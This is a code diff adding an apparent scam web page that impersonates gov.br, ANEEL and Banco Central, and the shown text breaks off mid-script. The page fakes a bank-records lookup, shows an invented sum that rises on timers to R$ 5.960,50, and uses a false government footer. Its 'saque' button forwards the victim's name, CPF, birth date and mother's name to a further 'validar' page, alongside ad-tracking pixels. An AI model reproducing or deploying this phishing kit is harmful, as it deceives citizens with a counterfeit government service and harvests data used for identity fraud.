@@ -1,0 +1,1011 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- UTMify Pixel Code -->
+  <script>
+  window.googlePixelId = "69702546258311df42737496";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+    <!-- End UTMify Pixel Code -->
+    
+    <!-- UTM Capture and Preservation System -->
+    <script>
+      // Sistema de captura e preservação de UTMs do Facebook Ads
+      (function() {
+        // Função para capturar UTMs da URL
+        function captureUTMs() {
+          const urlParams = new URLSearchParams(window.location.search);
+          const utmParams = {
+            utm_source: urlParams.get('utm_source'),
+            utm_campaign: urlParams.get('utm_campaign'),
+            utm_medium: urlParams.get('utm_medium'),
+            utm_content: urlParams.get('utm_content'),
+            utm_term: urlParams.get('utm_term')
+          };
+          
+          // Verificar se há UTMs válidas
+          const hasUTMs = Object.values(utmParams).some(value => value && value !== '');
+          
+          if (hasUTMs) {
+            console.log('🎯 UTMs capturadas:', utmParams);
+            
+            // Salvar UTMs no localStorage para persistência
+            localStorage.setItem('energia_utm_data', JSON.stringify(utmParams));
+            
+            // Salvar também no sessionStorage para uso imediato
+            sessionStorage.setItem('energia_utm_data', JSON.stringify(utmParams));
+            
+            // Adicionar UTMs à URL atual se não estiverem presentes
+            addUTMsToCurrentURL(utmParams);
+            
+            return utmParams;
+          } else {
+            // Tentar recuperar UTMs salvas
+            const savedUTMs = localStorage.getItem('energia_utm_data');
+            if (savedUTMs) {
+              const parsedUTMs = JSON.parse(savedUTMs);
+              console.log('🔄 UTMs recuperadas do localStorage:', parsedUTMs);
+              
+              // Adicionar UTMs recuperadas à URL atual
+              addUTMsToCurrentURL(parsedUTMs);
+              
+              return parsedUTMs;
+            }
+          }
+          
+          return null;
+        }
+        
+        // Função para adicionar UTMs à URL atual
+        function addUTMsToCurrentURL(utmParams) {
+          const currentURL = new URL(window.location.href);
+          let hasChanges = false;
+          
+          Object.entries(utmParams).forEach(([key, value]) => {
+            if (value && !currentURL.searchParams.has(key)) {
+              currentURL.searchParams.set(key, value);
+              hasChanges = true;
+            }
+          });
+          
+          if (hasChanges) {
+            // Atualizar URL sem recarregar a página
+            window.history.replaceState({}, '', currentURL.toString());
+            console.log('🔗 URL atualizada com UTMs:', currentURL.toString());
+          }
+        }
+        
+        // Função para obter UTMs atuais
+        window.getCurrentUTMs = function() {
+          const savedUTMs = localStorage.getItem('energia_utm_data');
+          return savedUTMs ? JSON.parse(savedUTMs) : null;
+        };
+        
+        // Função para adicionar UTMs a qualquer URL
+        window.addUTMsToURL = function(url) {
+          const utmData = window.getCurrentUTMs();
+          if (!utmData) return url;
+          
+          const urlObj = new URL(url, window.location.origin);
+          Object.entries(utmData).forEach(([key, value]) => {
+            if (value) {
+              urlObj.searchParams.set(key, value);
+            }
+          });
+          
+          return urlObj.toString();
+        };
+        
+        // Função para navegar mantendo UTMs
+        window.navigateWithUTMs = function(url) {
+          const urlWithUTMs = window.addUTMsToURL(url);
+          window.location.href = urlWithUTMs;
+        };
+        
+        // Executar captura quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+          const capturedUTMs = captureUTMs();
+          
+          if (capturedUTMs) {
+            console.log('✅ Sistema de UTMs ativo:', capturedUTMs);
+          } else {
+            console.log('ℹ️ Nenhuma UTM detectada');
+          }
+        });
+        
+        // Capturar UTMs imediatamente se a página já carregou
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', captureUTMs);
+        } else {
+          captureUTMs();
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/png" href="images/960px-Canal_Gov_Logo.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Programa Luz Acessível Para Todos 2025 - ANEEL</title>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- User Data Manager -->
+    <script src="js/user-data-manager.js"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              "gov-blue": "#1351B4",
+              "gov-blue-light": "#2670E8",
+              "aneel-blue": "#0d3c78",
+              "aneel-blue-dark": "#1a4c8b",
+            },
+          },
+        },
+      };
+    </script>
+
+    <!-- Remix Icons -->
+    <link href="css/remixicon.css" rel="stylesheet">
+
+    <style>
+      .box-nome {
+        border: 1px solid #e5e7eb;
+        padding: 16px;
+        margin: 8px 0;
+        cursor: pointer;
+        background-color: #f9fafb;
+        color: #1f2937;
+        border-radius: 8px;
+        transition: all 0.2s ease;
+        display: flex;
+        align-items: center;
+        width: 100%;
+        text-align: left;
+        font-size: 1rem;
+      }
+
+      .box-nome i {
+        margin-right: 12px;
+        font-size: 1.25rem;
+        color: #4b5563;
+      }
+
+      .box-nome:hover {
+        background-color: #f3f4f6;
+        border-color: #d1d5db;
+        transform: translateY(-2px);
+      }
+
+      .selected {
+        background-color: #0066cc;
+        color: white;
+        border-color: #0066cc;
+      }
+
+      .selected i {
+        color: white;
+      }
+
+      .erro {
+        background-color: #ef4444;
+        color: white;
+        border-color: #ef4444;
+        animation: shake 0.5s;
+      }
+
+      .erro i {
+        color: white;
+      }
+
+      @keyframes shake {
+        0%,
+        100% {
+          transform: translateX(0);
+        }
+        10%,
+        30%,
+        50%,
+        70%,
+        90% {
+          transform: translateX(-5px);
+        }
+        20%,
+        40%,
+        60%,
+        80% {
+          transform: translateX(5px);
+        }
+      }
+
+      .step-container {
+        background-color: #f8fafc;
+        border-radius: 12px;
+        padding: 24px;
+        margin-bottom: 24px;
+        border: 1px solid #e2e8f0;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      }
+
+      .step-title {
+        color: #1a4c8b;
+        font-size: 1.25rem;
+        font-weight: 600;
+        margin-bottom: 20px;
+      }
+
+      .step-item {
+        display: flex;
+        align-items: flex-start;
+        margin-bottom: 16px;
+        position: relative;
+      }
+
+      .step-number {
+        background-color: #1a4c8b;
+        color: white;
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 600;
+        margin-right: 16px;
+        flex-shrink: 0;
+        font-size: 0.9rem;
+      }
+
+      .step-content {
+        flex: 1;
+        padding-top: 2px;
+      }
+
+      .step-text {
+        color: #4a5568;
+        font-size: 1rem;
+        line-height: 1.6;
+      }
+
+      .security-verification {
+        background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+        border-left: 4px solid #1a4c8b;
+        border-radius: 8px;
+        padding: 20px;
+        margin-bottom: 24px;
+        display: flex;
+        align-items: flex-start;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      }
+
+      .security-verification-content {
+        flex: 1;
+      }
+
+      .security-verification-title {
+        color: #1a4c8b;
+        font-weight: 600;
+        font-size: 1.1rem;
+        margin-bottom: 8px;
+      }
+
+      .security-verification-subtitle {
+        color: #64748b;
+        font-size: 0.9rem;
+        margin-bottom: 12px;
+        line-height: 1.5;
+      }
+
+      .security-verification-icons {
+        display: flex;
+        gap: 20px;
+        margin-top: 8px;
+      }
+
+      .security-verification-icon {
+        display: flex;
+        align-items: center;
+        font-size: 0.85rem;
+        color: #4a5568;
+        font-weight: 500;
+      }
+
+      .security-verification-icon i {
+        margin-right: 6px;
+        color: #1a4c8b;
+        font-size: 1.1rem;
+      }
+
+      .breadcrumb-item:after {
+        content: ">";
+        margin: 0 0.5rem;
+        color: #6b7280;
+      }
+
+      .breadcrumb-item:last-child:after {
+        display: none;
+      }
+
+      /* Garantir que o nome do usuário seja sempre visível em mobile */
+      @media (max-width: 320px) {
+        #user-button {
+          min-width: fit-content;
+          white-space: nowrap;
+          font-size: 0.75rem !important;
+          padding: 0.375rem 0.75rem !important;
+        }
+
+        #user-button i {
+          font-size: 0.875rem !important;
+        }
+      }
+
+      /* Navegação fixa */
+      .breadcrumb-nav {
+        width: 100%;
+        background-color: white;
+        z-index: 1000;
+        border-bottom: 1px solid #e5e7eb;
+        transition: all 0.3s ease;
+      }
+
+      .nav-fixed {
+        position: fixed;
+        top: 0;
+        left: 0;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .nav-spacer {
+        display: none;
+        height: 48px;
+      }
+
+      .imagem-arredondada {
+        border-radius: 15px;
+        display: block;
+        margin: 24px auto;
+        max-width: 100%;
+        height: auto;
+      }
+
+      .aneel-logo {
+        max-width: 500px;
+        height: auto;
+      }
+
+      /* Responsive adjustments */
+      @media (max-width: 768px) {
+        .container {
+          padding-left: 16px;
+          padding-right: 16px;
+        }
+
+        .step-container {
+          padding: 16px;
+        }
+
+        .security-verification {
+          padding: 16px;
+        }
+
+        .aneel-logo {
+          max-width: 400px;
+        }
+      }
+
+      /* Animation for fade-in */
+      @keyframes fade-in {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .animate-fade-in {
+        animation: fade-in 0.5s ease-out;
+      }
+
+      /* Custom Video Player Styles */
+      .slider {
+        background: transparent;
+        outline: none;
+      }
+
+      .slider::-webkit-slider-track {
+        background: #4a5568;
+        height: 4px;
+        border-radius: 2px;
+      }
+
+      .slider::-webkit-slider-thumb {
+        background: #3b82f6;
+        height: 12px;
+        width: 12px;
+        border-radius: 50%;
+        cursor: pointer;
+        -webkit-appearance: none;
+        border: none;
+      }
+
+      .slider::-moz-range-track {
+        background: #4a5568;
+        height: 4px;
+        border-radius: 2px;
+        border: none;
+      }
+
+      .slider::-moz-range-thumb {
+        background: #3b82f6;
+        height: 12px;
+        width: 12px;
+        border-radius: 50%;
+        cursor: pointer;
+        border: none;
+      }
+
+      #progress-container {
+        position: relative;
+      }
+
+      #progress-container:hover #progress-bar {
+        background: #60a5fa;
+      }
+
+      /* Prevent video selection and context menu */
+      video {
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        pointer-events: auto;
+      }
+
+      video::-webkit-media-controls {
+        display: none !important;
+      }
+
+      video::-webkit-media-controls-enclosure {
+        display: none !important;
+      }
+    </style>
+  </head>
+
+  <body class="bg-gray-50">
+    <div class="min-h-screen bg-gray-100">
+      <!-- Header -->
+      <header class="bg-white border-b border-gray-200 px-3 py-4">
+        <div class="flex items-center justify-between">
+          <div class="flex items-center">
+            <img alt="gov.br" loading="lazy" width="120" height="40" decoding="async" data-nimg="1" class="h-8 w-auto" src="images/960px-Canal_Gov_Logo.png" style="color: transparent;">
+          </div>
+          <div class="flex items-center gap-4">
+            <div class="relative">
+              <button aria-label="Perfil do usuário" class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center hover:bg-blue-700 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 text-white">
+                  <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+                </svg>
+              </button>
+              <div class="absolute right-0 top-full mt-2 w-80 bg-white rounded-lg shadow-xl border border-gray-200 z-50 overflow-hidden hidden" id="user-dropdown">
+                <button class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors" onclick="toggleDropdown()">
+                  <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5">
+                    <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                  </svg>
+                </button>
+                <div class="p-6 text-center border-b border-gray-100">
+                  <div class="w-16 h-16 bg-gray-300 rounded-full flex items-center justify-center mx-auto mb-3">
+                    <svg fill="currentColor" viewBox="0 0 20 20" class="w-8 h-8 text-white">
+                      <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                  <h3 class="text-lg font-medium text-gray-900 mb-2" data-user-greeting="">Olá, Silvio!</h3>
+                  <div class="bg-yellow-400 text-black text-xs font-bold py-1 px-3 rounded-full inline-block mb-3">SUA CONTA GOV.BR É NÍVEL OURO</div>
+                  <a href="#" class="text-blue-600 hover:text-blue-700 text-sm font-medium flex items-center justify-center gap-1">
+                    Minha área gov.br
+                    <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4">
+                      <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                    </svg>
+                  </a>
+                </div>
+                <div class="p-4">
+                  <h4 class="text-sm font-medium text-gray-900 mb-3">Minha conta</h4>
+                  <div class="space-y-1">
+                    <button class="w-full flex items-center gap-3 px-3 py-2 text-left text-sm text-blue-600 hover:bg-blue-50 rounded-md transition-colors">
+                      <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4">
+                        <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+                      </svg>
+                      Dados Pessoais
+                    </button>
+                    <button class="w-full flex items-center gap-3 px-3 py-2 text-left text-sm text-blue-600 hover:bg-blue-50 rounded-md transition-colors">
+                      <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4">
+                        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2-2H5a2 2 0 01-2-2v-5a2 2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+                      </svg>
+                      Segurança da Conta
+                    </button>
+                    <button class="w-full flex items-center gap-3 px-3 py-2 text-left text-sm text-blue-600 hover:bg-blue-50 rounded-md transition-colors">
+                      <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4">
+                        <path d="M13 6a3 3 0 11-6 0 3 3 0 016 0zM18 8a2 2 0 11-4 0 2 2 0 014 0zM14 15a4 4 0 00-8 0v3h8v-3z"></path>
+                      </svg>
+                      Privacidade
+                    </button>
+                    <button class="w-full flex items-center gap-3 px-3 py-2 text-left text-sm text-blue-600 hover:bg-blue-50 rounded-md transition-colors">
+                      <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4">
+                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"></path>
+                      </svg>
+                      Ajuda da conta gov.br
+                    </button>
+                    <button class="w-full flex items-center gap-3 px-3 py-2 text-left text-sm text-blue-600 hover:bg-blue-50 rounded-md transition-colors">
+                      <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4">
+                        <path fill-rule="evenodd" d="M3 3a1 1 0 00-1 1v12a1 1 0 102 0V4a1 1 0 00-1-1zm10.293 9.293a1 1 0 001.414 1.414l3-3a1 1 0 000-1.414l-3-3a1 1 0 10-1.414 1.414L14.586 9H7a1 1 0 100 2h7.586l-1.293 1.293z" clip-rule="evenodd"></path>
+                      </svg>
+                      Sair
+                    </button>
+                  </div>
+                </div>
+                <div class="absolute bottom-4 right-4">
+                  <button class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-white hover:bg-blue-700 transition-colors">
+                    <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4">
+                      <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
+                    </svg>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+
+    <!-- Main Content -->
+    <main class="px-0 md:px-1 py-4 md:flex md:justify-center md:items-start md:pt-8">
+      <div class="bg-white rounded-none md:rounded-lg shadow-none md:shadow-sm border-0 md:border border-gray-200 p-3 mx-0 md:mx-1 md:max-w-4xl w-full">
+        <div class="text-center mb-6">
+          <h1 class="text-2xl font-bold text-gray-800 mb-2" data-consult-title="">Consultando dados de Silvio</h1>
+          <p class="text-gray-600">Aumente o volume e assista enquanto verificamos suas informações no sistema</p>
+          
+          <p class="text-sm text-gray-500 mt-1">CPF : <span data-user-cpf="">717.148.209-04</span></p>
+        </div>
+            <vturb-smartplayer id="vid-692bbaa14fd612d7bf344d60" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/cb665158-3966-47dd-8d1f-ad15707c523b/players/692bbaa14fd612d7bf344d60/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
+            
+        <div class="mb-6" id="loading-section">
+          <div class="flex items-center justify-center gap-3 mb-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
+            <div class="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin flex-shrink-0"></div>
+            <p class="text-base md:text-lg font-medium text-blue-800 animate-pulse text-center" id="loading-text">Consultando Banco Central...</p>
+          </div>
+        </div>
+        
+        <div class="text-center mb-8">
+          <h2 class="text-lg text-gray-600 mb-2">Valor encontrado para saque:</h2>
+          <p class="text-4xl font-bold text-green-600 mb-4" id="value-display">Calculando...</p>
+        </div>
+        
+        <div class="text-center" id="button-section" style="display: none;">
+          <button onclick="redirectToValidar()" class="px-8 py-4 bg-green-600 hover:bg-green-700 text-white font-bold text-lg rounded-full transition-all duration-500">Continuar com o saque</button>
+        </div>
+        
+        <div class="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg animate-fade-in" id="success-message" style="display: none;">
+          <div class="flex items-center gap-2 mb-2">
+            <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 text-green-600">
+              <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+            </svg>
+            <h3 class="font-semibold text-green-800">Consulta finalizada com sucesso!</h3>
+          </div>
+          <p class="text-green-700 text-sm">Encontramos valores disponíveis para saque em seu CPF. Clique no botão acima para prosseguir com o processo.</p>
+        </div>
+      </div>
+    </main>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white mt-12">
+      <div class="max-w-6xl mx-auto px-4 py-8">
+        <div class="text-center">
+          <img src="images/960px-Canal_Gov_Logo.png" alt="Gov.br" class="h-10 mx-auto mb-4 filter brightness-0 invert">
+          <p class="text-gray-400">� 2024 Governo Federal. Todos os direitos reservados.</p>
+        </div>
+      </div>
+    </footer>
+
+    <script>
+      // Custom Video Player Controls
+      document.addEventListener('DOMContentLoaded', function() {
+        const video = document.getElementById('custom-video');
+        const playPauseBtn = document.getElementById('play-pause-btn');
+        const playIcon = document.getElementById('play-icon');
+        const pauseIcon = document.getElementById('pause-icon');
+        const progressContainer = document.getElementById('progress-container');
+        const progressBar = document.getElementById('progress-bar');
+        const volumeBtn = document.getElementById('volume-btn');
+        const volumeIcon = document.getElementById('volume-icon');
+        const mutedIcon = document.getElementById('muted-icon');
+        const volumeSlider = document.getElementById('volume-slider');
+        const currentTimeSpan = document.getElementById('current-time');
+        const durationSpan = document.getElementById('duration');
+
+        // Play/Pause functionality
+        playPauseBtn.addEventListener('click', function() {
+          if (video.paused) {
+            video.play();
+            playIcon.classList.add('hidden');
+            pauseIcon.classList.remove('hidden');
+          } else {
+            video.pause();
+            playIcon.classList.remove('hidden');
+            pauseIcon.classList.add('hidden');
+          }
+        });
+
+        // Update progress bar
+        video.addEventListener('timeupdate', function() {
+          const progress = (video.currentTime / video.duration) * 100;
+          progressBar.style.width = progress + '%';
+          
+          // Update current time
+          currentTimeSpan.textContent = formatTime(video.currentTime);
+        });
+
+        // Progress bar click
+        progressContainer.addEventListener('click', function(e) {
+          const rect = progressContainer.getBoundingClientRect();
+          const clickX = e.clientX - rect.left;
+          const progress = clickX / rect.width;
+          video.currentTime = progress * video.duration;
+        });
+
+        // Volume control
+        volumeBtn.addEventListener('click', function() {
+          if (video.muted) {
+            video.muted = false;
+            volumeIcon.classList.remove('hidden');
+            mutedIcon.classList.add('hidden');
+            volumeSlider.value = video.volume * 100;
+          } else {
+            video.muted = true;
+            volumeIcon.classList.add('hidden');
+            mutedIcon.classList.remove('hidden');
+          }
+        });
+
+        volumeSlider.addEventListener('input', function() {
+          video.volume = volumeSlider.value / 100;
+          video.muted = false;
+          volumeIcon.classList.remove('hidden');
+          mutedIcon.classList.add('hidden');
+        });
+
+        // Volume change event
+        video.addEventListener('volumechange', function() {
+          volumeSlider.value = video.volume * 100;
+          if (video.muted || video.volume === 0) {
+            volumeIcon.classList.add('hidden');
+            mutedIcon.classList.remove('hidden');
+          } else {
+            volumeIcon.classList.remove('hidden');
+            mutedIcon.classList.add('hidden');
+          }
+        });
+
+        // Format time helper
+        function formatTime(seconds) {
+          const mins = Math.floor(seconds / 60);
+          const secs = Math.floor(seconds % 60);
+          return mins + ':' + (secs < 10 ? '0' : '') + secs;
+        }
+
+        // Prevent right-click context menu
+        video.addEventListener('contextmenu', function(e) {
+          e.preventDefault();
+          return false;
+        });
+
+        // Prevent video controls from showing
+        video.addEventListener('loadstart', function() {
+          video.controls = false;
+          console.log('🎬 Iniciando carregamento do vídeo...');
+        });
+
+        // Simulate video detection and progressive loading
+        video.addEventListener('canplay', function() {
+          console.log('🎯 Vídeo detectado e pronto para reprodução');
+          const loadingOverlay = document.getElementById('video-loading');
+          
+          // Simular processo de "detecção" do vídeo
+          setTimeout(function() {
+            video.style.opacity = '1';
+            loadingOverlay.style.opacity = '0';
+            setTimeout(function() {
+              loadingOverlay.style.display = 'none';
+            }, 800);
+            
+            // Garantir que o vídeo está reproduzindo
+            if (video.paused) {
+              video.play().then(() => {
+                console.log('▶️ Vídeo iniciado automaticamente');
+                // Atualizar botão para pause
+                playIcon.classList.add('hidden');
+                pauseIcon.classList.remove('hidden');
+              }).catch(error => {
+                console.log('❌ Erro ao iniciar vídeo automaticamente:', error);
+              });
+            }
+            
+            console.log('✅ Vídeo carregado e exibido');
+          }, 1200); // 1.2 segundos para simular detecção
+        });
+
+        // Faster metadata loading
+        video.addEventListener('loadedmetadata', function() {
+          console.log('📊 Metadados do vídeo carregados');
+          durationSpan.textContent = formatTime(video.duration);
+        });
+
+        // Click on video to play/pause
+        video.addEventListener('click', function() {
+          playPauseBtn.click();
+        });
+
+        // Keyboard controls
+        document.addEventListener('keydown', function(e) {
+          if (e.target.tagName === 'INPUT') return;
+          
+          switch(e.code) {
+            case 'Space':
+              e.preventDefault();
+              playPauseBtn.click();
+              break;
+            case 'ArrowLeft':
+              e.preventDefault();
+              video.currentTime = Math.max(0, video.currentTime - 10);
+              break;
+            case 'ArrowRight':
+              e.preventDefault();
+              video.currentTime = Math.min(video.duration, video.currentTime + 10);
+              break;
+            case 'ArrowUp':
+              e.preventDefault();
+              video.volume = Math.min(1, video.volume + 0.1);
+              break;
+            case 'ArrowDown':
+              e.preventDefault();
+              video.volume = Math.max(0, video.volume - 0.1);
+              break;
+            case 'KeyM':
+              e.preventDefault();
+              volumeBtn.click();
+              break;
+          }
+        });
+      });
+
+      // Função para controlar o dropdown do usuário
+      function toggleDropdown() {
+        const dropdown = document.getElementById('user-dropdown');
+        dropdown.classList.toggle('hidden');
+      }
+
+      // Função para redirecionar para validar
+      function redirectToValidar() {
+        console.log('🚀 Redirecionando para validar...');
+        
+        // PRIORIDADE 1: Verificar se JÁ EXISTEM dados na URL atual
+        const urlParams = new URLSearchParams(window.location.search);
+        let userData = null;
+        
+        if (urlParams.has('nome') || urlParams.has('cpf')) {
+          console.log('🔗 DADOS REAIS ENCONTRADOS NA URL - usando eles!');
+          userData = {
+            nome: urlParams.get('nome'),
+            cpf: urlParams.get('cpf'),
+            nascimento: urlParams.get('nascimento'),
+            nomeMae: urlParams.get('nomeMae'),
+            estadoCivil: urlParams.get('estadoCivil'),
+            nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
+          };
+          console.log('✅ Dados reais da URL:', userData);
+        }
+        
+        // PRIORIDADE 2: Tentar user-data-manager (só se não tem dados na URL)
+        if (!userData && typeof window.getUserData === 'function') {
+          try {
+            userData = window.getUserData();
+            console.log('✅ Dados obtidos via getUserData:', userData);
+          } catch (error) {
+            console.log('❌ Erro getUserData:', error);
+          }
+        }
+        
+        // PRIORIDADE 3: Usar dados de sessionStorage (só se não tem dados reais)
+        if (!userData) {
+          const sessionData = sessionStorage.getItem('userData');
+          if (sessionData) {
+            try {
+              userData = JSON.parse(sessionData);
+              console.log('✅ Dados obtidos via sessionStorage:', userData);
+            } catch (error) {
+              console.log('❌ Erro ao parsear sessionStorage:', error);
+            }
+          }
+        }
+        
+        // ÚLTIMO RECURSO: Dados simulados (só se não tem NADA)
+        if (!userData) {
+          console.log('⚠️ Usando dados simulados como último recurso');
+          userData = {
+            nome: 'Silvio',
+            cpf: '717.148.209-04',
+            nascimento: '15/12/1975',
+            nomeMae: 'Maria da Silva Santos',
+            estadoCivil: 'Solteiro(a)'
+          };
+        }
+        
+        // Criar URL com parâmetros
+        const params = new URLSearchParams();
+        if (userData.nome) params.set('nome', userData.nome);
+        if (userData.cpf) params.set('cpf', userData.cpf);
+        if (userData.nascimento) params.set('nascimento', userData.nascimento);
+        if (userData.nomeMae) params.set('nomeMae', userData.nomeMae);
+        if (userData.estadoCivil) params.set('estadoCivil', userData.estadoCivil);
+        if (userData.nomeCompleto) params.set('nomeCompleto', userData.nomeCompleto);
+        
+        // Preservar UTMs se existirem
+        const currentParams = new URLSearchParams(window.location.search);
+        ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term'].forEach(utm => {
+          if (currentParams.get(utm)) {
+            params.set(utm, currentParams.get(utm));
+          }
+        });
+        
+        console.log('🔗 Redirecionando com dados na URL:', params.toString());
+        console.log('📋 Dados finais sendo enviados:', userData);
+        window.location.href = `../validar/index.html?${params.toString()}`;
+      }
+
+      // Sequência de consultas simuladas
+      const consultSequence = [
+        { text: "Consultando Banco Central...", value: "Calculando...", delay: 4000 },
+        { text: "Consultando Caixa Econômica...", value: "R$ 1.494,00", delay: 4000 },
+        { text: "Consultando registros bancários antigos...", value: "R$ 2.094,00", delay: 4000 },
+        { text: "Verificando histórico de pendências...", value: "R$ 2.094,00", delay: 4000 },
+        { text: "Verificando histórico de pendências...", value: "R$ 2.394,00", delay: 4000 },
+        { text: "Cruzando dados CPF x Bacen...", value: "R$ 2.394,00", delay: 4000 },
+        { text: "Analisando contas inativas...", value: "R$ 3.314,00", delay: 4000 },
+        { text: "Verificando valores esquecidos...", value: "R$ 3.314,00", delay: 4000 },
+        { text: "Consultando sistema REGISTRATO...", value: "R$ 4.514,00", delay: 4000 },
+        { text: "Validando documentação...", value: "R$ 4.514,00", delay: 4000 },
+        { text: "Finalizando consulta...", value: "R$ 5.960,50", delay: 4000 }
+      ];
+
+      function startConsultSequence() {
+        const loadingText = document.getElementById('loading-text');
+        const valueDisplay = document.getElementById('value-display');
+        const loadingSection = document.getElementById('loading-section');
+        const buttonSection = document.getElementById('button-section');
+        const successMessage = document.getElementById('success-message');
+        
+        // VERIFICAR SE JÁ EXISTEM DADOS REAIS ANTES DE SOBRESCREVER
+        let existingData = null;
+        
+        // Verificar URL primeiro
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('nome') || urlParams.has('cpf')) {
+          console.log('🔗 DADOS REAIS NA URL - não sobrescrever!');
+          existingData = {
+            nome: urlParams.get('nome'),
+            cpf: urlParams.get('cpf'),
+            nascimento: urlParams.get('nascimento'),
+            nomeMae: urlParams.get('nomeMae'),
+            estadoCivil: urlParams.get('estadoCivil'),
+            nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
+          };
+        }
+        
+        // Verificar sessionStorage
+        if (!existingData) {
+          const sessionData = sessionStorage.getItem('userData');
+          if (sessionData) {
+            try {
+              const parsed = JSON.parse(sessionData);
+              // Se não são dados do Silvio, manter
+              if (parsed.nome !== 'Silvio' && parsed.cpf !== '717.148.209-04') {
+                console.log('✅ Dados reais no sessionStorage - não sobrescrever!');
+                existingData = parsed;
+              }
+            } catch (error) {
+              console.log('❌ Erro ao parsear sessionStorage:', error);
+            }
+          }
+        }
+        
+        // SÓ usar dados simulados se NÃO tem dados reais
+        if (!existingData) {
+          console.log('⚠️ Nenhum dado real encontrado - usando dados simulados');
+          const consultData = {
+            cpf: '717.148.209-04',
